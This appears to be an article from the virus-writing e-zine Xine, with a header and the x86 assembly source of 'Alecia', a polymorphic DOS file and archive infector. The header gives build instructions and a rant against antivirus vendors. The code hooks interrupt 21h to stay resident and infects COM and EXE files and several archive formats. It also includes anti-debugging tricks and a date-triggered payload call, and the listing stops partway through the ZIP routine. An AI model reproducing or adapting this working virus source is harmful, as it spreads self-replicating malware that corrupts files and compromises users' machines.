   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 207 |
   ;                                        \-----------------------------/


   ;
   ;                                 t$$t
   ;                                 `ýý'                  ,nn.
   ;             .sSSs,         ,cccccccc,                 øüüø
   ;             $TTtt$$Ss.     tt   ,c¬$$$¬c.
   ;             `ýüý'`S0$Sc    `œ' ,c¬*äêê$¬ý   ,nããã.        $$$$$$$$ý
   ;    ,cC&TT&Cc.      `$$SS.      `' ,¬$*äê$¬ý'     êZêZZt   ,nt$T$$$$$$$ý
   ;   ,&&&$&œtœ&&&,     `$R$S.     ,œœ  ¬$ê*$›'       ,êZZZý'  ,$TS$T$$$$$$ý
   ;   &&$&&&'  `&v&&0$   $ZZ$S    ,œ  Cê*êý       ,Zê**Z    S$T$ý$$$$$$ý ,
   ;   &&&$$&.  ,&&&&ý'  ,$$0Z$   ,  Cêê**,.  ,;›$$$Z.   $S$$,.$$$$ý ,$
   ;   `&&&$&&$$$&&&$   .s$$$Z$,x$$$$$$$; `Cê***ê*ê***ê*êCZZZZ.  `$$$$$$$$ý ,$$
   ;     `"üüüüüý'`&&. ,$$$$$$$$$$$$$$$$$, `tCê*ê*êê*êêtý'ZZZZZs  `$$$$$$ý ,$$$
   ;               `&t,$$$$$$Tý' `ý$$$$t   `ýýýýýýý'   `ýýýý'    øýýýø  ýüüü
   ;                `&`ýýýýý'          `ýü'                  ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                  .                                      ³ Star0[iKx] ³
   ;                                                         ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; Name: Alecia
   ;
   ; Size: 6288 at first generation , variable size after
   ;
   ; Date of birth: 12 may 1998
   ;
   ; Origin: Belgium
   ;
   ; Residency:        Hook interrupt 21 ,
   ;   install check:  put a delete with no value who return 6969h
   ;   infect:     on call 4E/4F by scanning name extension
   ;
   ;               Hook interrupt 24
   ;           Hide write protects problems
   ;
   ; Host:         COM - Typical + ENUNS supported
   ;           EXE - Typical dos exe with a size < 500k
   ;           ZIP - Drop + Internal file mark
   ;           RAR - Drop + Internal file mark
   ;           ARJ - Drop + Internal file mark
   ;           ACE - Drop + Internal file mark
   ;           HA  - Drop + Internal file mark
   ;           ARC/PAK - Drop + Internal file mark
   ;           LZH/LHA - Drop + Internal file mark
   ;           ZOO - Drop + Internal file mark
   ;
   ; Compiling comments :  There's a little bug in the poly engine,if the size
   ;           of alicia isn't even, then alicia'll produce hybrid
   ;           children , but  if the size is even , everything'll
   ;           work fine without problems.
   ;           I use TASM 4.01 plus TLINK 3.01, so for compilation
   ;           you just need to do in the dos prompt
   ;           TASM alicia.asm -> it's produce an OBJ + MAP
   ;           TLINK -t alicia.obj -> and you have the final COM
   ;
   ; Polymorphism :    I have wrote my poly  in about  4 days because B0z0
   ;           specially wait for finishing all the work on alicia
   ;           to release it. Sure he is not the best one and have
   ;           a few bad points I'll correct soon but for a poly ,
   ;           I included fake interrupt generator , complex noise;
   ;           genered  junk , value are  taken  from a  generated
   ;           table , I aslo included a sliding key , he generate
   ;           also  reserved register  for the  poly himself  and
   ;           change it  every  generation produced , that's take
   ;           from  fix  value  fixed when  installing  virus  in
   ;           memory
   ;
   ; Archive infector :    Archive ? hmmm , no I don't know, what's that ? eh,
   ;           okay ,  the virus drop a copy  of himself into  the
   ;           archive   and fix  the  virus  as an  little  image
   ;           displayer with a  trademark . he  infect  most know
   ;           archive , If you need more information , see tutes
   ;
   ; Personnal comments :  First, I have a word for the scene , sure it's cool
   ;           to produce great tutorials about engines,infects...
   ;           but the theory , everybody take it easy  . When you
   ;           want play on the ground, you have fastly a bankrout
   ;           of informations, you often need precise infos about
   ;           a lot of stuff , then no theory without code and no
   ;           code without specification . Take a minute to think
   ;           about that . Secundo for the av scene  :  Hey  guyz
   ;           you  earn money  with  your    scanner  from  virus
   ;           attack , specially you  want interrest company , in
   ;           fact you are in a wrong way ! Company, even if they
   ;           are  connected on the  internet aren't the cible of
   ;           viruses  if the computer management  is done with a
   ;           correct  management . I saw  your price  in catalog
   ;           and I can say that you  profite of the ignorance of
   ;           computer manager  who only study C++ at  university
   ;           and believe that viruses are things who destroy his
   ;           computer. And it works, then you earn money with my
   ;           work, acceptable ? No ,of course , I take hours and
   ;           hours on  programming one  virus just  for pleasure
   ;           and learning programming. You build a  scanner with
   ;           heuristic and scan  string and you are happy . What
   ;           can I do  against  that ?  Nothing , but  now  , av
   ;           companies  ( I specially think to  this new one who
   ;           begin by I and finish by M )  begin  to lie more to
   ;           poeple. Why? because they know your ignorence about
   ;           viruses and provoque  panic , earn  more money , if
   ;           I could correct the IBM publicity, I'll remplace it
   ;           by : Hey Henri , why are you lying for the count of
   ;           IBM !  It's much better in that way
   ;
   ;           - A N Y W A Y I H A T E Y O U -
   ;

   .286
   .model tiny
   .code

   org 100h

   start:

   push es                                         ; save segment for exe
   push ds

   push cs cs                                      ; fix es = cs = ds
   pop es ds

   not sp                                          ; anti tbclean
   not sp

   call start_here                                 ; install virus

   TheEnd:

   pop ds                                          ; restore initial segment
   pop es

   db  0bfh                    ; equal mov di,offreturn
   offreturn:      dw offset payload
   add di,bp
   jmp     di

   start_here:     pop     bp                      ; get the delta offset :]
           sub     bp,offset start_here-(start_here-TheEnd)

   mov ah,2Ah
   int 21h
   cmp dh,05
   jne stcontinue

   cmp dl,24
   jne stcontinue

   call payload

   stcontinue:

   xor cx,cx
   mov ax,1369h
   int 21h                                         ; check if we are installed

   cmp cx,6969h
   jnz install                                     ; our check

   jmp TheEnd

   install:

   call polyinit_value                             ; init value for our poly

   mov ax,3521h
   int 21h                                         ; get int 21 handler

   mov     word ptr cs:[bp+Old10S],es              ; save 21 offset
   mov     word ptr cs:[bp+Old10O],bx

   mov ah,62h                                      ; install virus into resident
   int 21h

   push bx                                         ; save bx
   push bx                                         ; set es = bx
   pop es

   push bp
   mov bp,10000/16
   call allocate                                   ; allocate memory
   pop bp

   push ax
   dec ax
   mov es,ax

   mov byte ptr es:[0],'Z'                         ; hide to dos segment
   mov word ptr es:[1],08

   pop es
   pop ds

   xor di,di
   push di
   pop si
   mov cx,100h
   repz movsb                                      ; put our psp in memory

   push cs
   pop ds

   lea si,[bp+start]                               ; copy virus
   push 100h
   pop di
   mov cx,fin-start
   repz movsb                                      ; put our virus in memory

   push ds es
   pop ds

   mov     ax,2521h+1
   dec     ax
   mov     dx,offset NewInt_21             ; DS:DX = Int 21 Handler
   int     21h                             ; Set the new handler

   pop ds

   jmp TheEnd

   WeAreAlready:                                   ; test for our presence

   popa
   popf
   mov cx,6969h                                    ; return our mark of presence
   iret

   NewInt_21:              pushf
               pusha

                           cmp     ax,1369h                    ; check
                           je      WeAreAlready                ; installation
               cmp     ah,4eh
               je      infect_4eh
                           cmp     ah,4fh                      ; check
                           je      infect_4eh                  ; for infection

   JumpTo1:        popa
               popf

   JmpTO21:        db 0eah
   Old10O:         dw 0
   Old10S:         dw 0
   texto:          db ?

   Do_21:                                          ; make da 21
       pushf
       push cs
           call jmpto21                            ; make a jump int 21h
       ret

   infect_4eh:

   popa                                    ; restore all reg
   popf
   push es                                 ; save es ds
   push ds

   call Do_21                              ; simulate that 4Eh is done
   pushf
   pusha
   jc skip_4eh                             ; if error then skip infection proc

   mov ah,2Fh                              ; get dta , get name from dta!
   int 21h

   push es
   push bx

   mov word ptr cs:[seghost],es            ;

   mov ax,word ptr es:[bx+26]
   mov dx,word ptr es:[bx+28]
   mov word ptr cs:[finallowsize],ax       ; save size
   mov word ptr cs:[finalhisize],dx

   add bx,30
   mov word ptr cs:[offhost],bx
   call infect_proc                        ; test for possible infection

   pop bx
   pop es
   mov ax,word ptr cs:[finallowsize]
   mov dx,word ptr cs:[finalhisize]
   mov word ptr es:[bx+26],ax
   mov word ptr es:[bx+28],dx

   skip_4Eh:                               ;
   popa                                    ; restore all reg and quit
   popf

   pop ds
   pop es
   retf 2                                  ;

   infect_proc:                            ; infection procedure

   call save_state                         ; save all
   call security_check                     ; check if alarm
   jc security_fail

   mov si,word ptr cs:[offhost]            ; get extension
   mov ds,word ptr cs:[seghost]
   push ds
   push si
   call get_host                           ; check if we can infect this type
   jc security_fail                        ; op file

   pop si
   mov dx,si
   push si

   call test_inf                           ; test if infected
   jc security_fail

   pop dx
   pop ds
   push dx
   push ds

   call preview_condition
   jc security_fail                        ; test poly conditions ( mem )

   call openf
   jc security_fail                        ; open for write

   push cs cs
   call propoly                          ; generate a poly version of the virus
   pop es ds

   call di                                 ; infect here

   call polydelocator                      ; uninstall poly from memory

   pop ds
   pop dx

   call closef                             ; close file

   push ax
   push bx

   security_fail:                          ; return to the caller

   pop bx
   pop ax

   push cs cs
   pop es ds

   call restore_state                      ; restore all condition for the
   ret                                     ; continue process

   allocate:

   push bx
   push ds                                         ; Coded by UnKm'97

   inc bp
   mov ah,4ah                                      ; modify it at your risk !!!
   mov bx,0FFFFh
   int 21h                                         ; ask for memory
                                                   ; but in com , that's equal 0
   mov ah,4ah                                      ; now ask
   sub bx,bp                                       ; for free memory
   int 21h                                         ; and dos does it

   dec bp
   mov ah,48h                                      ; now , allocate free memory
   mov bx,bp                                       ; in a new segment
   int 21h

   pop ds                      ; restore all seg
   pop bx
   ret

   delocate:                                       ; delocator

   push bx
   mov ah,49h
   int 21h                                         ; delocate in es
   pop bx

   ret

   set_a_name:

   mov ah,2Ch                              ; set a name with the timer 4 digits
   int 21h

   and cx,0000111100001111b                ; then we have 0x 0x in ch
   and dx,0000111100001111b                ; and 0y 0y in ch

   add cx,4141h                            ; now we have a normal 4 bytes
   add dx,4141h                            ; string
   mov word ptr cs:[betaname],cx
   mov word ptr cs:[betaname+2],dx
   mov word ptr cs:[betaname+4],'C.'       ; add .com extension
   mov word ptr cs:[betaname+6],'MO'
   mov word ptr cs:[betaname+8],0

   mov cx,9

   ret

   crc_calc:                                       ; get crc32 from ds:si

   push bx
   push si cx

   call crc_table              ; render crc table

   pop cx si

   mov bp,cx

   mov cx,0ffffh                           ; reset crc counter to 0ffffffffh
   mov dx,0ffffh

   xor ax,ax

   Crc_loop:

   lodsb                                   ; get byte from ds:si
   mov bx,ax
   xor bl,cl
   mov cl,ch                               ; calculation
   mov ch,dl
   mov dl,dh
   mov dh,bh
   shl bx,1
   shl bx,1
   xor cx,word ptr cs:[bx+di]
   xor dx,word ptr cs:[bx+di+02]
   dec bp                                  ; one more

   jnz Crc_loop

   not dx
   not cx

   pop bx
   ret

   crc_table:                              ; render the table

   push es                                 ; save all segment
   push ds

   push cs
   push cs
   pop es
   pop ds

   mov    di,offset starttable+1024-2  ; the buffer table
                       ; remember : It begin by the end
   mov    bp,255               ; set bp equal 255
                       ; 255 * 4 = 1024
   std                 ; set Direction Flag On

   TableHighloop:              ; the major loop in the Crc table Calc

   mov cx,8                ; set the minus loop to 8
   mov dx,bp               ; dx = bp , major counter loop
   xor     ax,ax               ; ax = zero

   TableLowLoop:

   shr    ax,1             ; mov one byte of ax at right in bin
   rcr    dx,1             ; if anything losted , put it on dx

   jae    anomality            ; if superior or equal skip encrypt.

   xor    dx,08320h            ; encrypt value by a signature
   xor    ax,0EDB8h            ;

   anomality:

   loop   TableLowLoop         ; make it 8 times

   stosw                   ; write ax
   xchg   dx,ax
   stosw                   ; not write dx
   dec    bp               ; decrement the counter

   jnz TableHighLoop           ; repeat it until bp = 0

   mov word ptr cs:[di],0          ; last value equal 0
   sub di,2
   mov word ptr cs:[di],0
   cld                 ; clear direction flag

   pop ds
   pop es

   ret

   crc_calc16:                             ; render crc 16 from ds:si

   push bx
   push cx
   call rendertable                        ; build the table
   pop cx
   cld
   xor ax,ax
   xor bx,bx                               ; set bx = crc counter to zero

   render_loop:                            ; make crc calculation
   lodsb
   xor bl,al
   mov al,bh
   mov bh,ah
   shl bx,1
   mov bx,word ptr cs:[bx+starttable]
   xor bx,ax
   loop render_loop                        ; make da loop x times

   xchg bx,dx

   pop bx

   ret

   rendertable:                                    ; crc16 table

   push es                                         ; save seg and fix cs=ds=es
   push ds

   push cs
   push cs
   pop es
   pop ds

   mov bx,0a001h
   mov di,offset starttable                       ; build the table in startable
   xor dx,dx
   crc_jnz:
   mov ax,dx
   mov cx,8

   crc16_loop:

   shr ax,1
   jae crc16_ja
   xor ax,bx

   crc16_ja:       loop crc16_loop                ; make the loop

   stosw
   inc dl
   jnz crc_jnz

   pop ds
   pop es

   ret

   go:
                                                              ; go to by dos
   xor cx,cx                                                  ; called a lot
   xor dx,dx

   gozero:
   mov ah,42h                                      ; move the point in handle
   int 21h

   ret

   infect_ace:                                     ; ace infection see tute

   mov ah,3fh
   mov cx,4
   mov dx,offset temporary1                                ; open file
   int 21h

   xor cx,cx
   mov dx,word ptr cs:[temporary1+2]
   add dx,4
   xor ax,ax
   call gozero                                     ; go to the 1st header +4

   mov word ptr cs:[temporary1+512],ax
   mov word ptr cs:[temporary1+512+2],dx           ; save offset

   mov ah,3fh
   mov cx,256
   push cx
   mov dx,offset temporary1
   int 21h
   pop cx                                          ; read 256 bytes

   mov si,offset temporary1
   mov di,offset temporary1+256

   repz movsb                                      ; copy 1 temporary in tmp+256

   call ace_header                                 ; build one ace header

   mov bp,offset temporary1+256

   mov ax,word ptr cs:[bp+0fh]                     ; check for our infection
   and al,00001111b                                ; mark
   cmp al,00001010b
   je ace_invalid

   mov ax,word ptr cs:[bp+0fh]
   and al,11110000b
   add al,00001010b
   mov word ptr cs:[bp+0fh],ax                    ; if so then put our mark

   push bp

   lea si,[bp+4]
   mov cx,word ptr cs:[bp+2]

   call crc_calc                                   ; calculate the crc
   pop bp

   not cx
   mov word ptr cs:[bp],cx

   mov dx,word ptr cs:[temporary1+512]
   mov cx,word ptr cs:[temporary1+512+2]

   xor ax,ax
   call gozero                                             ; go in the begining

   mov ah,40h
   mov cx,word ptr cs:[bp+2]
   add cx,4
   mov dx,bp
   int 21h                                         ; and write our header mark

   mov al,2
   call go

   sub bp,256

   mov ah,40h                                    ; write our virus header
   mov cx,word ptr cs:[bp+2]
   add cx,4
   mov dx,offset temporary1
   int 21h

   call write_virus                                ; write our virus

   ACE_invalid:

   ret

   ACE_header:                                     ; build an header

   mov bp,offset temporary1

   mov byte ptr cs:[bp+4],01
   mov word ptr cs:[bp+5],8001h                    ; fix file type

   mov ax,word ptr cs:[totalsize]                  ; fix size
   mov word ptr cs:[bp+7],ax
   mov word ptr cs:[bp+7+2],0
   mov word ptr cs:[bp+0Bh],ax
   mov word ptr cs:[bp+0Bh+2],0


   mov cx,word ptr cs:[precrc32cx]
   mov dx,word ptr cs:[precrc32dx]                 ; fix crc

   not dx
   not cx

   mov word ptr cs:[bp+17h],cx
   mov word ptr cs:[bp+17h+2],dx

   call set_a_name                                 ; set the name
   dec cx
   mov word ptr cs:[bp+1Dh+4],cx
   mov word ptr cs:[bp+02],cx
   add word ptr cs:[bp+02],1Fh

   lea di,[bp+1Fh+4]
   mov si,offset betaname

   repz movsb

   push bp

   lea si,[bp+4]
   mov cx,word ptr cs:[bp+2]

   call crc_calc                                   ; get the crc
   pop bp

   not cx
   mov word ptr cs:[bp],cx

   ret

   infect_arc:                             ; arc infection see tutes

   mov ah,3fh
   mov cx,1dh
   push cx
   mov dx,offset temporary1
   push dx
   pop bp
   int 21h                                 ; read first header
   pop cx
   mov si,offset temporary1
   mov di,offset temporary1+1dh
   repz movsb                              ; put

   cmp byte ptr cs:[bp],1Ah                ; check if arc
   jne ARC_invalid

   cmp word ptr cs:[bp+2],'PH'
   je ARC_invalid

   cmp word ptr cs:[bp+2],'TS'             ; check for other type
   jne ARC_correct

   ARC_invalid:

   ret

   arc_correct:

   call ARC_header                         ; build an header

   mov bp,offset temporary1+1dh

   mov ax,word ptr cs:[bp+13h]             ; check for time stamp if installed
   and al,00001111b
   cmp al,00001010b
   je arc_invalid

   mov ax,word ptr cs:[bp+13h]
   and al,11110000b
   add al,00001010b
   mov word ptr cs:[bp+13h],ax

   mov al,0
   call go

   mov ah,40h                              ; write the header
   mov cx,1dh
   mov dx,offset temporary1+1Dh
   int 21h

   mov al,02
   call go

   sub ax,12
   sbb dx,0

   push ax
   push dx
   push ax
   push dx

   pop cx
   pop dx
   xor ax,ax
   call gozero

   mov ah,3fh
   mov cx,12
   mov dx,offset betaname
   int 21h                                         ; save last 12 bytes

   cmp byte ptr cs:[betaname],01ah

   pop cx
   pop dx

   xor ax,ax
   call gozero

   mov ah,40h
   mov cx,1dh
   mov dx,offset temporary1
   int 21h                                         ; write ourheader

   call write_virus                                ; write our virus+betaname

   mov ah,40h
   mov cx,12
   mov dx,offset betaname
   int 21h

   jmp arc_invalid

   ARC_header:                                     ; build an arc header

   lea bp,[temporary1]
   mov byte ptr cs:[bp+1],2

   call set_a_name
   lea di,[bp+2]
   mov si,offset betaname
   repz movsb

   mov ax,word ptr cs:[totalsize]                          ; size
   mov word ptr cs:[bp+0fh],ax
   mov word ptr cs:[bp+0fh+2],0
   mov word ptr cs:[bp+19h],ax
   mov word ptr cs:[bp+19h+2],0

   mov dx,word ptr cs:[precrc16]                           ; crc

   mov word ptr cs:[bp+17h],dx

   ret

   infect_arj:                                             ; arj infection see
                                                           ; tutes
   mov ah,3fh
   mov cx,256
   mov dx,offset temporary1
   int 21h

   xor ax,ax
   call go

   cmp word ptr cs:[temporary1],0EA60h                     ; check integrity
   jne invalid_arj

   mov ax,word ptr cs:[temporary1+13]                      ; check mark
   and al,00001111b
   cmp al,00001010b
   je invalid_arj

   mov ax,word ptr cs:[temporary1+13]
   and al,11110000b
   add al,00001010b
   mov word ptr cs:[temporary1+13],ax

   lea si,[temporary1+4]
   mov cx,word ptr cs:[temporary1+2]

   push si
   push cx
   call crc_calc                                           ; get crc32 of the
   pop ax                                                  ; header
   pop si
   add si,ax

   mov word ptr cs:[si],cx
   mov word ptr cs:[si+2],dx

   mov cx,ax

   cmp word ptr cs:[si+4],0
   jne invalid_arj

   add cx,8

   mov ah,40h
   mov dx,offset temporary1
   int 21h                                                 ; write the virus

   xor ax,ax
   call go

   lea bp,[temporary1]
   add bp,word ptr cs:[temporary1+2]
   add bp,8

   cmp word ptr cs:[bp],0
   jne invalid_arj

   add bp,2
   mov dx,bp
   sub dx,offset temporary1
   mov cx,0
   xor ax,ax
   call gozero

   mov ah,3fh
   mov cx,256
   mov dx,offset temporary1+256
   push dx
   int 21h                                         ; read one header
   pop bp

   cmp word ptr cs:[bp],0EA60h                     ; check integrity
   je continue_arj

   invalid_arj:

   ret

   continue_arj:

   mov byte ptr cs:[bp+09h],0                      ; fix the header
   mov byte ptr cs:[bp+0Ah],0

   mov ax,word ptr cs:[totalsize]                  ; size

   mov word ptr cs:[bp+10h],ax
   mov word ptr cs:[bp+10h+2],0

   mov word ptr cs:[bp+14h],ax
   mov word ptr cs:[bp+14h+2],0

   mov cx,word ptr cs:[precrc32cx]                 ; crc
   mov dx,word ptr cs:[precrc32dx]

   mov word ptr cs:[bp+18h],cx
   mov word ptr cs:[bp+18h+2],dx

   call set_a_name                                 ; set a name

   mov si,offset betaname
   lea di,[bp+1Ch+6]

   repz movsb

   mov byte ptr cs:[di],0
   inc di

   lea ax,[di-4]
   sub ax,bp

   mov word ptr cs:[bp+2],ax

   push ax
   pop cx

   push bp
   push di

   lea si,[bp+4]

   call crc_calc                                   ; get crc of the header

   pop di
   pop bp

   mov word ptr cs:[di],cx
   inc di
   inc di
   mov word ptr cs:[di],dx
   inc di
   inc di
   mov word ptr cs:[di],0

   mov ax,2
   call go                                         ; go to the end

   sub ax,4
   sbb dx,0

   push dx
   push ax
   pop dx
   pop cx

   xor ax,ax
   call gozero

   mov ah,40h
   mov cx,word ptr cs:[bp+2]
   add cx,4+6
   mov dx,bp
   int 21h                                         ; write our header

   call write_virus                                ; wrie our virus

   mov word ptr cs:[bp+2],0

   mov ah,40h-1
   inc ah
   mov cx,4
   mov dx,bp
   int 21h

   jmp invalid_arj

   infect_com:                                     ; basic com infection

   mov ah,3fh-1
   inc ah
   mov cx,3
   mov dx,offset saved
   int 21h                                         ; save 3 first byte

   cmp byte ptr cs:[saved],'Z'
   je fincom
   cmp byte ptr cs:[saved],'M'
   je fincom                                       ; check for com

   mov al,2
   call go                                         ; go to the end

   sub ax,3
   mov word ptr cs:[buffer7+1],ax

   mov al,0
   call go

   mov byte ptr cs:[buffer7],0e9h                  ; build a jump virus

   mov ah,40h-1
   mov cx,3
   mov dx,offset buffer7
   inc ah
   int 21h                                         ; write virus

   mov al,2
   call go

   sub ax,7

   xchg ax,dx
   xor cx,cx
   mov ax,4200h
   int 21h                                         ; go to the begin

   mov ah,3fh
   mov cx,7
   mov dx,offset buffer7
   int 21h                                         ; save last 7 bytes

   call polydelocator
   call propoly                                    ; reactualize poly
   call write_virus                                ; write the virus

   mov cx,word ptr cs:[totalsize]
   add cx,7
   add word ptr cs:[buffer7+5],cx

   mov ah,40h
   mov cx,7
   mov dx,offset buffer7
   int 21h                                         ; upgrade ENUNS mark

   fincom:

   ret

   return_com:                                     ; return to the host

   lea si,[bp+saved]
   push 100h
   pop di
   push di
   movsw
   movsb

   ret

   saved:          db 0,0,0

   infect_exe:

   cmp word ptr [finalhisize],7                    ; compare exe size
   ja close

   mov ah,3fh-1
   inc ah
   mov cx,1ch
   lea dx,[temporary1]
   int 21h

   cmp byte ptr cs:[temporary1],'M'                        ; check if really
   jne close                                               ; an exe
   cmp byte ptr cs:[temporary1+1],'Z'
   jne close
   cmp byte ptr cs:[temporary1+24],64                      ; check win
   je close
   cmp word ptr cs:[temporary1+1ah],0                      ; check overlay
   jne close

   call infectexe                                    ;  buil exe header

   mov al,0
   call go

   mov ah,40h
   mov cx,1ah
   lea dx,[temporary1]
   int 21h                                         ; write poly header

   mov al,2
   call go

   call polydelocator
   call propoly                                    ; reactualize poly
   call write_virus                                ; write virus

   close: ret

   infectexe:                                      ; infect exe

   mov cx,word ptr cs:[temporary1+14h]            ; save the exe_ip/exe_cs
   mov dx,word ptr cs:[temporary1+16h]
   mov word ptr cs:[exe_ip],cx
   mov word ptr cs:[exe_cs],dx

   mov al,2
   call go                                         ; go to the end

   push ax
   push dx

   push bx

   mov bx,word ptr cs:[temporary1+8h]                      ; reactulize cs:ip
   mov cl,4                                                ; start pointer
   shl bx,cl
   sub ax,bx
   sbb dx,0

   mov cx,10h
   div cx

   mov word ptr cs:[temporary1+14h],dx
   mov word ptr cs:[temporary1+16h],ax

   pop bx dx ax

   push dx
   mov dx,word ptr cs:[totalsize]                          ; reactulize size
   add ax,dx
   pop dx
   adc dx,0
   mov cx,512
   div cx
   inc ax
   mov word ptr cs:[temporary1+4],ax
   mov word ptr cs:[temporary1+2],dx

   mov al,0
   call go

   ret

   return_exe:                                     ; return to the host

   mov ax,es
   add ax,10h
   add word ptr cs:[bp+exe_cs],ax

   db 0eah

   exe_ip:     dw 0
   exe_cs:     dw 0

   infect_ha:                                      ; infect ha , see tutes

   mov ah,3fh
   mov cx,256
   mov dx,offset temporary1
   int 21h

   cmp word ptr cs:[temporary1],'AH'               ; compare ha mark
   jne HA_invalid

   inc word ptr cs:[temporary1+2]

   mov ax,word ptr cs:[temporary1+0dh+4]           ; check our infection mark
   and al,00001111b
   cmp al,00001010b
   je ha_invalid

   mov ax,word ptr cs:[temporary1+0dh+4]
   and al,11110000b
   add al,00001010b
   mov word ptr cs:[temporary1+0dh+4],ax

   mov al,0
   call go

   mov ah,40h                                      ; write our new header
   mov cx,0Dh+4+4
   mov dx,offset temporary1
   int 21h

   mov al,2
   call go

   call HA_build                                   ; build header

   mov ah,40h
   mov dx,offset temporary1+4
   int 21h                                         ; write header

   call write_virus                                ; write the virus

   HA_invalid:

   ret

   HA_build:                                       ; build ha header

   mov bp,offset temporary1+4
   mov byte ptr cs:[bp],20h

   inc bp
   mov ax,word ptr cs:[totalsize]                  ; fix the size
   mov word ptr cs:[bp],ax
   mov word ptr cs:[bp+2],0

   add bp,4
   mov cx,ax
   mov word ptr cs:[bp],cx
   mov word ptr cs:[bp+2],0
   add bp,4

   mov cx,word ptr cs:[precrc32cx]
   mov dx,word ptr cs:[precrc32dx]

   mov word ptr cs:[bp],cx                         ; set crc
   mov word ptr cs:[bp+2],dx

   add bp,8

   mov byte ptr cs:[bp],0
   inc bp

   call set_a_name                                 ; set the name

   mov di,bp
   add bp,cx
   mov si,offset betaname

   repz movsb

   mov cx,bp
   sub cx,offset temporary1+1

   mov word ptr cs:[bp],0102h
   mov byte ptr cs:[bp+2],20h

   ret

   infect_lzh:                                     ; infect lzh

   mov ah,3fh
   mov cx,256
   push cx
   mov dx,offset temporary1
   int 21h                                         ; read 256 first bytes
   pop cx

   cmp word ptr cs:[temporary1+2],'l-'
   jne LZH_invalid

   mov si,offset temporary1
   lea di,[si+256]
   repz movsb

   call LZH_header                                 ; build our header

   mov bp,offset temporary1+256

   mov ax,word ptr cs:[bp+0fh]                     ; check our virus mark
   and al,00001111b
   cmp al,00001010b
   jne lzh_notinvalid

   LZH_invalid:

   ret

   lzh_notinvalid:

   mov ax,word ptr cs:[bp+0fh]
   and al,11110000b
   add al,00001010b
   mov word ptr cs:[bp+0fh],ax                     ; fix our mark

   xor cx,cx
   mov cl,byte ptr cs:[bp]

   lea si,[bp+2]

   xor ax,ax

   LZH_loop1:                                      ; actualize checksum
   add ah,byte ptr cs:[si]
   inc si
   dec cx
   jnz LZH_loop1

   mov byte ptr cs:[bp+1],ah

   xor ax,ax
   call go

   mov ah,40h                                              ; write new header
   mov cx,word ptr cs:[bp]
   xor ch,ch
   inc cx
   inc cx
   mov dx,bp
   int 21h

   mov al,02
   call go

   sub ax,7
   sbb dx,0

   push ax
   push dx
   push ax
   push dx

   pop cx
   pop dx
   xor ax,ax
   call gozero                                             ; go to the end-7

   mov ah,3fh
   mov cx,7
   push cx
   mov dx,offset betaname
   push dx
   int 21h                                                 ; read 7 bytes

   pop bp
   pop cx
   add bp,7                                                ; check if exist
                                                           ; zero packet
   testforzero:
   cmp byte ptr cs:[bp],0
   je continue
   dec bp
   dec cx
   jnz testforzero

   jmp LZH_invalid

   continue:

   mov bp,cx

   pop ax
   pop dx
   add dx,cx
   xchg ax,cx

   xor ax,ax
   call gozero

   mov ah,40h
   mov cx,2
   add cl,byte ptr cs:[temporary1]
   mov dx,offset temporary1
   int 21h                                 ; write our header

   call write_virus                        ; write our virus

   mov ah,40h
   mov cx,7
   sub cx,bp
   mov dx,offset betaname
   add dx,bp
   int 21h                                 ; write dead packet

   jmp lzh_invalid

   LZH_header:                             ; build lzh header

   lea bp,[temporary1]

   mov byte ptr cs:[bp+5],'0'

   mov ax,word ptr cs:[totalsize]          ; fix size
   mov word ptr cs:[bp+7],ax
   mov word ptr cs:[bp+7+2],0
   mov word ptr cs:[bp+7+4],ax
   mov word ptr cs:[bp+7+4+2],0

   call set_a_name                         ; set the name
   dec cx

   mov byte ptr cs:[bp+15h],cl

   mov di,bp
   add di,16h
   mov si,offset betaname

   repz movsb

   mov dx,word ptr cs:[precrc16]           ; the crc
   mov word ptr cs:[di],dx

   sub di,bp
   mov cx,di

   mov byte ptr cs:[bp],cl

   lea si,[bp+2]

   xor ax,ax

   LZH_loop1b:                             ; the checksum
   add ah,byte ptr cs:[si]
   inc si
   dec di
   jnz LZH_loop1b

   mov byte ptr cs:[bp+1],ah

   ret

   infect_rar:                                             ; infect rar

   mov ah,3fh
   mov cx,256
   mov dx,offset temporary1
   int 21h

   cmp word ptr cs:[temporary1],6152h                      ; check if
   jne invalid_rar                                         ; normal rar

   lea bp,[temporary1+14h]

   cmp word ptr cs:[bp+2],74h                              ; check if doesn't
   je rar_right                                            ; comment exist

   invalid_rar:

   ret

   rar_right:

   mov ax,word ptr cs:[bp+20]
   and al,00001111b
   cmp al,00001010b
   je invalid_rar

   mov ax,word ptr cs:[bp+20]                      ; mark the archive
   and al,11110000b
   add al,00001010b
   mov word ptr cs:[bp+20],ax

   push bp

   lea si,[bp+2]
   mov cx,word ptr cs:[bp+5]
   sub cx,2

   call crc_calc                                   ; get the crc of the new
                                                   ; header
   pop bp

   mov word ptr cs:[bp],cx

   xor cx,cx
   mov dx,14h

   xor ax,ax
   call gozero

   mov ah,40h
   mov cx,word ptr cs:[bp+5]
   mov dx,bp
   int 21h                                         ; write new header

   cmp word ptr cs:[bp+3],8000h                    ; check if header correct
   jne invalid_rar

   mov ax,word ptr cs:[totalsize]                  ; build new header

   mov word ptr cs:[bp+07h],ax                     ; set size
   mov word ptr cs:[bp+07h+2],0
   mov word ptr cs:[bp+0Bh],ax
   mov word ptr cs:[bp+0Bh+2],0

   mov cx,word ptr cs:[precrc32cx]                 ; crc
   mov dx,word ptr cs:[precrc32dx]

   mov word ptr cs:[bp+10h],cx
   mov word ptr cs:[bp+10h+2],dx

   mov byte ptr cs:[bp+019h],30h                   ; compression

   call set_a_name                                 ; name
   dec cx
   mov byte ptr cs:[bp+1Ah],cl
   mov word ptr cs:[bp+5],cx
   add word ptr cs:[bp+5],20h
   mov si,offset betaname
   lea di,[bp+20h]
   repz movsb                                      ;

   mov cx,word ptr cs:[bp+5]
   push cx
   push bp
   sub cx,2

   lea si,[bp+2]
   call crc_calc                                   ; render crc header

   pop bp

   mov word ptr cs:[bp],cx

   mov ax,2
   call go

   mov ah,40h
   pop cx
   mov dx,bp
   int 21h

   call write_virus                                ; write the virus

   jmp invalid_rar

   infect_zip:                                     ; infect zip

   mov bp,36000/16
   call allocate
   jc invalid_zip

